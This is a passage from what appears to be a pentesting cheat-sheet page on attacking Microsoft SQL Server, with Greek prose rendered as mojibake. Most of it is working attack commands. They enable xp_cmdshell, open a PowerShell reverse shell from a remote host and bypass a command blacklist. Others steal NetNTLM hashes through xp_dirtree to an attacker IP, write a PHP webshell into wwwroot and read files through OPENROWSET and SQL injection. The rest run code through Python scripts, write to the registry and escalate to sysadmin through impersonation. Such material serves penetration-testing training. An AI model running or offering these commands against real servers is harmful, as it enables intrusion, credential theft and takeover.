sp_configure 'show advanced options', '1'
RECONFIGURE
#This enables xp_cmdshell
sp_configure 'xp_cmdshell', '1'
RECONFIGURE

#One liner
sp_configure 'Show Advanced Options', 1; RECONFIGURE; sp_configure 'xp_cmdshell', 1; RECONFIGURE;

# Quickly check what the service account is via xp_cmdshell
EXEC master..xp_cmdshell 'whoami'
# Get Rev shell
EXEC xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString("http://10.10.14.13:8000/rev.ps1") | powershell -noprofile'

# Bypass blackisted "EXEC xp_cmdshell"
'; DECLARE @x AS VARCHAR(100)='xp_cmdshell'; EXEC @x 'ping k7s3rpqn8ti91kvy0h44pre35ublza.burpcollaborator.net' â€”
```
### ÎšÎ»Î­ÏˆÏ„Îµ Ï„Î¿ hash Ï„Î¿Ï… NetNTLM / Î•Ï€Î¯Î¸ÎµÏƒÎ· Relay

Î ÏÎ­Ï€ÎµÎ¹ Î½Î± Î¾ÎµÎºÎ¹Î½Î®ÏƒÎµÏ„Îµ Î­Î½Î± **Î´Î¹Î±ÎºÎ¿Î¼Î¹ÏƒÏ„Î® SMB** Î³Î¹Î± Î½Î± Î±Î¹Ï‡Î¼Î±Î»Ï‰Ï„Î¯ÏƒÎµÏ„Îµ Ï„Î¿ hash Ï€Î¿Ï… Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯Ï„Î±Î¹ ÏƒÏ„Î·Î½ Ï„Î±Ï…Ï„Î¿Ï€Î¿Î¯Î·ÏƒÎ· (`impacket-smbserver` Î® `responder` Î³Î¹Î± Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î±).
```bash
xp_dirtree '\\<attacker_IP>\any\thing'
exec master.dbo.xp_dirtree '\\<attacker_IP>\any\thing'
EXEC master..xp_subdirs '\\<attacker_IP>\anything\'
EXEC master..xp_fileexist '\\<attacker_IP>\anything\'

# Capture hash
sudo responder -I tun0
sudo impacket-smbserver share ./ -smb2support
msf> use auxiliary/admin/mssql/mssql_ntlm_stealer
```
{% hint style="warning" %}
ÎœÏ€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± ÎµÎ»Î­Î³Î¾ÎµÏ„Îµ Î±Î½ Ï€Î¿Î¹Î¿Ï‚ (ÎµÎºÏ„ÏŒÏ‚ Î±Ï€ÏŒ Ï„Î¿Ï…Ï‚ ÏƒÏ…ÏƒÏ„Î·Î¼Î¹ÎºÎ¿ÏÏ‚ Î´Î¹Î±Ï‡ÎµÎ¹ÏÎ¹ÏƒÏ„Î­Ï‚) Î­Ï‡ÎµÎ¹ Î´Î¹ÎºÎ±Î¹ÏÎ¼Î±Ï„Î± Î½Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÎ¹ Î±Ï…Ï„Î­Ï‚ Ï„Î¹Ï‚ Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¯ÎµÏ‚ MSSQL Î¼Îµ:
```sql
Use master;
EXEC sp_helprotect 'xp_dirtree';
EXEC sp_helprotect 'xp_subdirs';
EXEC sp_helprotect 'xp_fileexist';
```
{% endhint %}

Î§ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ ÎµÏÎ³Î±Î»ÎµÎ¯Î± ÏŒÏ€Ï‰Ï‚ Ï„Î¿ **responder** Î® Ï„Î¿ **Inveigh** ÎµÎ¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„ÏŒÎ½ Î½Î± **ÎºÎ»Î­ÏˆÎµÏ„Îµ Ï„Î¿ NetNTLM hash**.\
ÎœÏ€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î´ÎµÎ¯Ï„Îµ Ï€Ï‰Ï‚ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ Î±Ï…Ï„Î¬ Ï„Î± ÎµÏÎ³Î±Î»ÎµÎ¯Î± ÏƒÏ„Î¿:

{% content-ref url="../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md" %}
[spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
{% endcontent-ref %}

### ÎšÎ±Ï„Î¬Ï‡ÏÎ·ÏƒÎ· Ï„Ï‰Î½ Î£Ï…Î½Î´Î­ÏƒÎµÏ‰Î½ Î•Î¼Ï€Î¹ÏƒÏ„Î¿ÏƒÏÎ½Î·Ï‚ Ï„Î¿Ï… MSSQL

[**Î”Î¹Î±Î²Î¬ÏƒÏ„Îµ Î±Ï…Ï„Î® Ï„Î·Î½ Î±Î½Î¬ÏÏ„Î·ÏƒÎ·**](../../windows-hardening/active-directory-methodology/abusing-ad-mssql.md) **Î³Î¹Î± Ï€ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎµÏ‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ ÏƒÏ‡ÎµÏ„Î¹ÎºÎ¬ Î¼Îµ Ï„Î¿ Ï€ÏÏ‚ Î½Î± ÎºÎ±Ï„Î±Ï‡ÏÎ·ÏƒÏ„ÎµÎ¯Ï„Îµ Î±Ï…Ï„ÏŒ Ï„Î¿ Ï‡Î±ÏÎ±ÎºÏ„Î·ÏÎ¹ÏƒÏ„Î¹ÎºÏŒ:**

{% content-ref url="../../windows-hardening/active-directory-methodology/abusing-ad-mssql.md" %}
[abusing-ad-mssql.md](../../windows-hardening/active-directory-methodology/abusing-ad-mssql.md)
{% endcontent-ref %}

### **Î•Î³Î³ÏÎ±Ï†Î® Î‘ÏÏ‡ÎµÎ¯Ï‰Î½**

Î“Î¹Î± Î½Î± ÎµÎ³Î³ÏÎ¬ÏˆÎµÏ„Îµ Î±ÏÏ‡ÎµÎ¯Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Ï„Î¿ `MSSQL`, **Ï‡ÏÎµÎ¹Î¬Î¶ÎµÏ„Î±Î¹ Î½Î± ÎµÎ½ÎµÏÎ³Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ** Ï„Î¹Ï‚ [**Î”Î¹Î±Î´Î¹ÎºÎ±ÏƒÎ¯ÎµÏ‚ Î‘Ï…Ï„Î¿Î¼Î±Ï„Î¹ÏƒÎ¼Î¿Ï Ole**](https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/ole-automation-procedures-server-configuration-option), Î¿Î¹ Î¿Ï€Î¿Î¯ÎµÏ‚ Î±Ï€Î±Î¹Ï„Î¿ÏÎ½ Î´Î¹ÎºÎ±Î¹ÏÎ¼Î±Ï„Î± Î´Î¹Î±Ï‡ÎµÎ¹ÏÎ¹ÏƒÏ„Î®, ÎºÎ±Î¹ ÏƒÏ„Î· ÏƒÏ…Î½Î­Ï‡ÎµÎ¹Î± Î½Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÏ„Îµ Î¿ÏÎ¹ÏƒÎ¼Î­Î½ÎµÏ‚ Î±Ï€Î¿Î¸Î·ÎºÎµÏ…Î¼Î­Î½ÎµÏ‚ Î´Î¹Î±Î´Î¹ÎºÎ±ÏƒÎ¯ÎµÏ‚ Î³Î¹Î± Ï„Î· Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î¯Î± Ï„Î¿Ï… Î±ÏÏ‡ÎµÎ¯Î¿Ï…:
```bash
# Enable Ole Automation Procedures
sp_configure 'show advanced options', 1
RECONFIGURE

sp_configure 'Ole Automation Procedures', 1
RECONFIGURE

# Create a File
DECLARE @OLE INT
DECLARE @FileID INT
EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
EXECUTE sp_OADestroy @FileID
EXECUTE sp_OADestroy @OLE
```
### **Î‘Î½Î¬Î³Î½Ï‰ÏƒÎ· Î±ÏÏ‡ÎµÎ¯Î¿Ï… Î¼Îµ** OPENROWSET

Î‘Ï€ÏŒ Ï€ÏÎ¿ÎµÏ€Î¹Î»Î¿Î³Î®, Ï„Î¿ `MSSQL` ÎµÏ€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ Ï„Î·Î½ Î±Î½Î¬Î³Î½Ï‰ÏƒÎ· Î±ÏÏ‡ÎµÎ¯Ï‰Î½ **ÏƒÎµ Î¿Ï€Î¿Î¹Î¿Î´Î®Ï€Î¿Ï„Îµ Î±ÏÏ‡ÎµÎ¯Î¿ ÏƒÏ„Î¿ Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¹ÎºÏŒ ÏƒÏÏƒÏ„Î·Î¼Î± ÏƒÏ„Î¿ Î¿Ï€Î¿Î¯Î¿ Î¿ Î»Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼ÏŒÏ‚ Î­Ï‡ÎµÎ¹ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· Î±Î½Î¬Î³Î½Ï‰ÏƒÎ·Ï‚**. ÎœÏ€Î¿ÏÎ¿ÏÎ¼Îµ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎ¿Ï…Î¼Îµ Ï„Î¿ Î±ÎºÏŒÎ»Î¿Ï…Î¸Î¿ ÎµÏÏÏ„Î·Î¼Î± SQL:
```sql
SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
```
Î©ÏƒÏ„ÏŒÏƒÎ¿, Î· ÎµÏ€Î¹Î»Î¿Î³Î® **`BULK`** Î±Ï€Î±Î¹Ï„ÎµÎ¯ Ï„Î·Î½ Î¬Î´ÎµÎ¹Î± **`ADMINISTER BULK OPERATIONS`** Î® Ï„Î·Î½ Î¬Î´ÎµÎ¹Î± **`ADMINISTER DATABASE BULK OPERATIONS`**.
```sql
# Check if you have it
SELECT * FROM fn_my_permissions(NULL, 'SERVER') WHERE permission_name='ADMINISTER BULK OPERATIONS' OR permission_name='ADMINISTER DATABASE BULK OPERATIONS';
```
#### Î£Ï†Î¬Î»Î¼Î± Î²Î±ÏƒÎ¹ÏƒÎ¼Î­Î½Î¿ Î´Î¹Î¬Î½Ï…ÏƒÎ¼Î± Î³Î¹Î± SQLi:
```
https://vuln.app/getItem?id=1+and+1=(select+x+from+OpenRowset(BULK+'C:\Windows\win.ini',SINGLE_CLOB)+R(x))--
```
### **RCE/Î‘Î½Î¬Î³Î½Ï‰ÏƒÎ· Î±ÏÏ‡ÎµÎ¯Ï‰Î½ ÎµÎºÏ„Î­Î»ÎµÏƒÎ·Ï‚ ÏƒÎµÎ½Î±ÏÎ¯Ï‰Î½ (Python ÎºÎ±Î¹ R)**

Î¤Î¿ MSSQL Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÏƒÎ±Ï‚ ÎµÏ€Î¹Ï„ÏÎ­ÏˆÎµÎ¹ Î½Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÏ„Îµ **ÏƒÎµÎ½Î¬ÏÎ¹Î± ÏƒÎµ Python ÎºÎ±Î¹/Î® R**. Î‘Ï…Ï„ÏŒÏ‚ Î¿ ÎºÏÎ´Î¹ÎºÎ±Ï‚ Î¸Î± ÎµÎºÏ„ÎµÎ»ÎµÏƒÏ„ÎµÎ¯ Î±Ï€ÏŒ Î­Î½Î±Î½ **Î´Î¹Î±Ï†Î¿ÏÎµÏ„Î¹ÎºÏŒ Ï‡ÏÎ®ÏƒÏ„Î·** Î±Ï€ÏŒ Î±Ï…Ï„ÏŒÎ½ Ï€Î¿Ï… Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯ Ï„Î¿ **xp\_cmdshell** Î³Î¹Î± Î½Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÎ¹ ÎµÎ½Ï„Î¿Î»Î­Ï‚.

Î Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î± Ï€ÏÎ¿ÏƒÏ€Î¬Î¸ÎµÎ¹Î±Ï‚ ÎµÎºÏ„Î­Î»ÎµÏƒÎ·Ï‚ ÎµÎ½ÏŒÏ‚ **'R'** _"ÎšÎ±Î»Î·Î¼Î­ÏÎ± ÎšÏŒÏƒÎ¼Îµ!"_ **Ï€Î¿Ï… Î´ÎµÎ½ Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³ÎµÎ¯**:

![](<../../.gitbook/assets/image (393).png>)

Î Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î± Ï‡ÏÎ®ÏƒÎ·Ï‚ Ï€ÏÎ¿ÏƒÎ±ÏÎ¼Î¿ÏƒÎ¼Î­Î½Î¿Ï… Python Î³Î¹Î± Î½Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÏ„Îµ Î´Î¹Î¬Ï†Î¿ÏÎµÏ‚ ÎµÎ½Î­ÏÎ³ÎµÎ¹ÎµÏ‚:
```sql
# Print the user being used (and execute commands)
EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(__import__("getpass").getuser())'
EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(__import__("os").system("whoami"))'
#Open and read a file
EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(open("C:\\inetpub\\wwwroot\\web.config", "r").read())'
#Multiline
EXECUTE sp_execute_external_script @language = N'Python', @script = N'
import sys
print(sys.version)
'
GO
```
### Î”Î¹Î±Î²Î¬ÏƒÏ„Îµ Ï„Î¿ ÎœÎ·Ï„ÏÏÎ¿

Î¤Î¿ Microsoft SQL Server Ï€Î±ÏÎ­Ï‡ÎµÎ¹ **Ï€Î¿Î»Î»Î­Ï‚ ÎµÏ€ÎµÎºÏ„ÎµÎ¹Î½ÏŒÎ¼ÎµÎ½ÎµÏ‚ Î±Ï€Î¿Î¸Î·ÎºÎµÏ…Î¼Î­Î½ÎµÏ‚ Î´Î¹Î±Î´Î¹ÎºÎ±ÏƒÎ¯ÎµÏ‚** Ï€Î¿Ï… ÏƒÎ±Ï‚ ÎµÏ€Î¹Ï„ÏÎ­Ï€Î¿Ï…Î½ Î½Î± Î±Î»Î»Î·Î»ÎµÏ€Î¹Î´ÏÎ¬Ï„Îµ ÏŒÏ‡Î¹ Î¼ÏŒÎ½Î¿ Î¼Îµ Ï„Î¿ Î´Î¯ÎºÏ„Ï…Î¿ Î±Î»Î»Î¬ ÎºÎ±Î¹ Î¼Îµ Ï„Î¿ ÏƒÏÏƒÏ„Î·Î¼Î± Î±ÏÏ‡ÎµÎ¯Ï‰Î½ ÎºÎ±Î¹ Î±ÎºÏŒÎ¼Î· ÎºÎ±Î¹ Ï„Î¿ [**ÎœÎ·Ï„ÏÏÎ¿ Ï„Ï‰Î½ Windows**](https://blog.waynesheffield.com/wayne/archive/2017/08/working-registry-sql-server)**:**

| **ÎšÎ±Î½Î¿Î½Î¹ÎºÏŒ**                  | **Î•Ï…Î±Î¹ÏƒÎ¸Î·ÏƒÎ¯Î± ÏƒÏ„Î¿ Î Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î±**                     |
| ---------------------------- | -------------------------------------- |
| sys.xp\_regread              | sys.xp\_instance\_regread              |
| sys.xp\_regenumvalues        | sys.xp\_instance\_regenumvalues        |
| sys.xp\_regenumkeys          | sys.xp\_instance\_regenumkeys          |
| sys.xp\_regwrite             | sys.xp\_instance\_regwrite             |
| sys.xp\_regdeletevalue       | sys.xp\_instance\_regdeletevalue       |
| sys.xp\_regdeletekey         | sys.xp\_instance\_regdeletekey         |
| sys.xp\_regaddmultistring    | sys.xp\_instance\_regaddmultistring    |
| sys.xp\_regremovemultistring | sys.xp\_instance\_regremovemultistring |
```sql
# Example read registry
EXECUTE master.sys.xp_regread 'HKEY_LOCAL_MACHINE', 'Software\Microsoft\Microsoft SQL Server\MSSQL12.SQL2014\SQLServerAgent', 'WorkingDirectory';
# Example write and then read registry
EXECUTE master.sys.xp_instance_regwrite 'HKEY_LOCAL_MACHINE', 'Software\Microsoft\MSSQLSERVER\SQLServerAgent\MyNewKey', 'MyNewValue', 'REG_SZ', 'Now you see me!';
EXECUTE master.sys.xp_instance_regread 'HKEY_LOCAL_MACHINE', 'Software\Microsoft\MSSQLSERVER\SQLServerAgent\MyNewKey', 'MyNewValue';
# Example to check who can use these functions
Use master;
EXEC sp_helprotect 'xp_regread';
EXEC sp_helprotect 'xp_regwrite';
```
Î“Î¹Î± **Ï€ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎ± Ï€Î±ÏÎ±Î´ÎµÎ¯Î³Î¼Î±Ï„Î±** Î±Î½Î±Ï„ÏÎ­Î¾Ï„Îµ ÏƒÏ„Î·Î½ [**Ï€ÏÏ‰Ï„ÏŒÏ„Ï…Ï€Î· Ï€Î·Î³Î®**](https://blog.waynesheffield.com/wayne/archive/2017/08/working-registry-sql-server/).

### RCE Î¼Îµ MSSQL User Defined Function - SQLHttp <a href="#mssql-user-defined-function-sqlhttp" id="mssql-user-defined-function-sqlhttp"></a>

Î•Î¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„ÏŒÎ½ Î½Î± **Ï†Î¿ÏÏ„ÏÏƒÎµÏ„Îµ Î­Î½Î± .NET dll Î¼Î­ÏƒÎ± ÏƒÏ„Î¿ MSSQL Î¼Îµ Ï€ÏÎ¿ÏƒÎ±ÏÎ¼Î¿ÏƒÎ¼Î­Î½ÎµÏ‚ Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¯ÎµÏ‚**. Î‘Ï…Ï„ÏŒ, Ï‰ÏƒÏ„ÏŒÏƒÎ¿, **Î±Ï€Î±Î¹Ï„ÎµÎ¯ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÏ„Î¿ `dbo`**, Î¿Ï€ÏŒÏ„Îµ Ï‡ÏÎµÎ¹Î¬Î¶ÎµÏƒÏ„Îµ ÏƒÏÎ½Î´ÎµÏƒÎ· Î¼Îµ Ï„Î· Î²Î¬ÏƒÎ· Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½ **Ï‰Ï‚ `sa` Î® Î¼Îµ ÏÏŒÎ»Î¿ Î”Î¹Î±Ï‡ÎµÎ¹ÏÎ¹ÏƒÏ„Î®**.

[**Î‘ÎºÎ¿Î»Î¿Ï…Î¸ÏÎ½Ï„Î±Ï‚ Î±Ï…Ï„ÏŒÎ½ Ï„Î¿Î½ ÏƒÏÎ½Î´ÎµÏƒÎ¼Î¿**](../../pentesting-web/sql-injection/mssql-injection.md#mssql-user-defined-function-sqlhttp) Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î´ÎµÎ¯Ï„Îµ Î­Î½Î± Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î±.

### Î†Î»Î»Î¿Î¹ Ï„ÏÏŒÏ€Î¿Î¹ Î³Î¹Î± RCE

Î¥Ï€Î¬ÏÏ‡Î¿Ï…Î½ ÎºÎ±Î¹ Î¬Î»Î»ÎµÏ‚ Î¼ÎµÎ¸ÏŒÎ´Î¿Î¹ Î³Î¹Î± Î½Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÏ„Îµ ÎµÎ½Ï„Î¿Î»Î­Ï‚, ÏŒÏ€Ï‰Ï‚ Î· Ï€ÏÎ¿ÏƒÎ¸Î®ÎºÎ· [ÎµÏ€ÎµÎºÏ„ÎµÎ¸Î­Î½Ï„Ï‰Î½ Î±Ï€Î¿Î¸Î·ÎºÎµÏ…Î¼Î­Î½Ï‰Î½ Î´Î¹Î±Î´Î¹ÎºÎ±ÏƒÎ¹ÏÎ½](https://docs.microsoft.com/en-us/sql/relational-databases/extended-stored-procedures-programming/adding-an-extended-stored-procedure-to-sql-server), [CLR Assemblies](https://docs.microsoft.com/en-us/dotnet/framework/data/adonet/sql/introduction-to-sql-server-clr-integration), [SQL Server Agent Jobs](https://docs.microsoft.com/en-us/sql/ssms/agent/schedule-a-job?view=sql-server-ver15) ÎºÎ±Î¹ [ÎµÎ¾Ï‰Ï„ÎµÏÎ¹ÎºÎ¬ scripts](https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-execute-external-script-transact-sql).

## Î‘Î½ÏŒÎ´Î¿Ï‚ Î ÏÎ¿Î½Î¿Î¼Î¯Ï‰Î½ ÏƒÏ„Î¿ MSSQL

### Î‘Ï€ÏŒ db\_owner ÏƒÎµ sysadmin

Î‘Î½ Î­Î½Î±Ï‚ **ÎºÎ±Î½Î¿Î½Î¹ÎºÏŒÏ‚ Ï‡ÏÎ®ÏƒÏ„Î·Ï‚** Î»Î¬Î²ÎµÎ¹ Ï„Î¿Î½ ÏÏŒÎ»Î¿ **`db_owner`** Ï€Î¬Î½Ï‰ ÏƒÏ„Î· **Î²Î¬ÏƒÎ· Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½ Ï€Î¿Ï… Î±Î½Î®ÎºÎµÎ¹ ÏƒÎµ Î­Î½Î±Î½ Î´Î¹Î±Ï‡ÎµÎ¹ÏÎ¹ÏƒÏ„Î®** Ï‡ÏÎ®ÏƒÏ„Î· (ÏŒÏ€Ï‰Ï‚ Î¿ **`sa`**) ÎºÎ±Î¹ Î±Ï…Ï„Î® Î· Î²Î¬ÏƒÎ· Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½ ÎµÎ¯Î½Î±Î¹ ÏÏ…Î¸Î¼Î¹ÏƒÎ¼Î­Î½Î· Ï‰Ï‚ **`trustworthy`**, Î¿ Ï‡ÏÎ®ÏƒÏ„Î·Ï‚ Î±Ï…Ï„ÏŒÏ‚ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏ…Ï„ÎµÎ¯ Î±Ï…Ï„Î¬ Ï„Î± Ï€ÏÎ¿Î½ÏŒÎ¼Î¹Î± Î³Î¹Î± **Î±Î½ÏŒÎ´Î¿ Ï€ÏÎ¿Î½Î¿Î¼Î¯Ï‰Î½** ÎµÏ€ÎµÎ¹Î´Î® **Î±Ï€Î¿Î¸Î·ÎºÎµÏ…Î¼Î­Î½ÎµÏ‚ Î´Î¹Î±Î´Î¹ÎºÎ±ÏƒÎ¯ÎµÏ‚** Ï€Î¿Ï… Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î¿ÏÎ½Ï„Î±Î¹ ÎµÎºÎµÎ¯ Î¼Ï€Î¿ÏÎ¿ÏÎ½ Î½Î± **ÎµÎºÏ„ÎµÎ»ÎµÏƒÏ„Î¿ÏÎ½** Ï‰Ï‚ Î¿ Î¹Î´Î¹Î¿ÎºÏ„Î®Ï„Î·Ï‚ (**Î´Î¹Î±Ï‡ÎµÎ¹ÏÎ¹ÏƒÏ„Î®Ï‚**).
```sql
# Get owners of databases
SELECT suser_sname(owner_sid) FROM sys.databases

# Find trustworthy databases
SELECT a.name,b.is_trustworthy_on
FROM master..sysdatabases as a
INNER JOIN sys.databases as b
ON a.name=b.name;

# Get roles over the selected database (look for your username as db_owner)
USE <trustworthy_db>
SELECT rp.name as database_role, mp.name as database_user
from sys.database_role_members drm
join sys.database_principals rp on (drm.role_principal_id = rp.principal_id)
join sys.database_principals mp on (drm.member_principal_id = mp.principal_id)

# If you found you are db_owner of a trustworthy database, you can privesc:
--1. Create a stored procedure to add your user to sysadmin role
USE <trustworthy_db>

CREATE PROCEDURE sp_elevate_me
WITH EXECUTE AS OWNER
AS
EXEC sp_addsrvrolemember 'USERNAME','sysadmin'

--2. Execute stored procedure to get sysadmin role
USE <trustworthy_db>
EXEC sp_elevate_me

--3. Verify your user is a sysadmin
SELECT is_srvrolemember('sysadmin')
```
ÎœÏ€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ Î­Î½Î± **module Ï„Î¿Ï… metasploit**:
```bash
msf> use auxiliary/admin/mssql/mssql_escalate_dbowner
```
Î‰ Î­Î½Î± **PS** script:
```powershell
# https://raw.githubusercontent.com/nullbind/Powershellery/master/Stable-ish/MSSQL/Invoke-SqlServer-Escalate-Dbowner.psm1
Import-Module .Invoke-SqlServerDbElevateDbOwner.psm1
Invoke-SqlServerDbElevateDbOwner -SqlUser myappuser -SqlPass MyPassword! -SqlServerInstance 10.2.2.184
```
### Î ÏÎ¿ÏƒÏ‰Ï€Î¿Ï€Î¿Î¯Î·ÏƒÎ· Î¬Î»Î»Ï‰Î½ Ï‡ÏÎ·ÏƒÏ„ÏÎ½

ÎŸ SQL Server Î­Ï‡ÎµÎ¹ Î­Î½Î± ÎµÎ¹Î´Î¹ÎºÏŒ Î´Î¹ÎºÎ±Î¯Ï‰Î¼Î±, Î¼Îµ Ï„Î¿ ÏŒÎ½Î¿Î¼Î± **`IMPERSONATE`**, Ï€Î¿Ï… **ÎµÏ€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ ÏƒÏ„Î¿Î½ ÎµÎºÏ„ÎµÎ»Î¿ÏÎ½Ï„Î± Ï‡ÏÎ®ÏƒÏ„Î· Î½Î± Î±Î½Î±Î»Î¬Î²ÎµÎ¹ Ï„Î± Î´Î¹ÎºÎ±Î¹ÏÎ¼Î±Ï„Î± ÎµÎ½ÏŒÏ‚ Î¬Î»Î»Î¿Ï… Ï‡ÏÎ®ÏƒÏ„Î·** Î® ÏƒÏÎ½Î´ÎµÏƒÎ·Ï‚ Î¼Î­Ï‡ÏÎ¹ Î½Î± ÎµÏ€Î±Î½Î±Ï†ÎµÏÎ¸ÎµÎ¯ Î¿ Ï€Î»Î±Î¯ÏƒÎ¹Î¿ Î® Î½Î± Î»Î®Î¾ÎµÎ¹ Î· ÏƒÏ…Î½ÎµÎ´ÏÎ¯Î±.
```sql
# Find users you can impersonate
SELECT distinct b.name
FROM sys.server_permissions a
INNER JOIN sys.server_principals b
ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE'
# Check if the user "sa" or any other high privileged user is mentioned

# Impersonate sa user
EXECUTE AS LOGIN = 'sa'
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
```
{% hint style="info" %}
Î‘Î½ Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Ï€ÏÎ¿ÏƒÏ‰Ï€Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ Î­Î½Î±Î½ Ï‡ÏÎ®ÏƒÏ„Î·, Î±ÎºÏŒÎ¼Î± ÎºÎ¹ Î±Î½ Î´ÎµÎ½ ÎµÎ¯Î½Î±Î¹ sysadmin, Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± ÎµÎ»Î­Î³Î¾ÎµÏ„Îµ Î±Î½ Î¿ Ï‡ÏÎ®ÏƒÏ„Î·Ï‚ Î­Ï‡ÎµÎ¹ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÎµ Î¬Î»Î»ÎµÏ‚ Î²Î¬ÏƒÎµÎ¹Ï‚ Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½ Î® ÏƒÏ…Î½Î´ÎµÎ´ÎµÎ¼Î­Î½Î¿Ï…Ï‚ Î´Î¹Î±ÎºÎ¿Î¼Î¹ÏƒÏ„Î­Ï‚.
{% endhint %}

Î£Î·Î¼ÎµÎ¹ÏÏƒÏ„Îµ ÏŒÏ„Î¹ Î±Ï†Î¿Ï Î³Î¯Î½ÎµÏ„Îµ sysadmin Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Ï€ÏÎ¿ÏƒÏ‰Ï€Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ Î¿Ï€Î¿Î¹Î¿Î½Î´Î®Ï€Î¿Ï„Îµ Î¬Î»Î»Î¿:
```sql
-- Impersonate RegUser
EXECUTE AS LOGIN = 'RegUser'
-- Verify you are now running as the the MyUser4 login
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
-- Change back to sa
REVERT
```
ÎœÏ€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÏ„Îµ Î±Ï…Ï„Î®Î½ Ï„Î·Î½ ÎµÏ€Î¯Î¸ÎµÏƒÎ· Î¼Îµ Î­Î½Î± **module Ï„Î¿Ï… metasploit**:
```bash
msf> auxiliary/admin/mssql/mssql_escalate_execute_as
```
Î® Î¼Îµ Î­Î½Î± ÏƒÎµÎ½Î¬ÏÎ¹Î¿ **PS**:
```powershell
# https://raw.githubusercontent.com/nullbind/Powershellery/master/Stable-ish/MSSQL/Invoke-SqlServer-Escalate-ExecuteAs.psm1
Import-Module .Invoke-SqlServer-Escalate-ExecuteAs.psm1
Invoke-SqlServer-Escalate-ExecuteAs -SqlServerInstance 10.2.9.101 -SqlUser myuser1 -SqlPass MyPassword!
```
## Î§ÏÎ®ÏƒÎ· Ï„Î¿Ï… MSSQL Î³Î¹Î± Î”Î¹Î±Ï„Î®ÏÎ·ÏƒÎ·

[https://blog.netspi.com/sql-server-persistence-part-1-startup-stored-procedures/](https://blog.netspi.com/sql-server-persistence-part-1-startup-stored-procedures/)

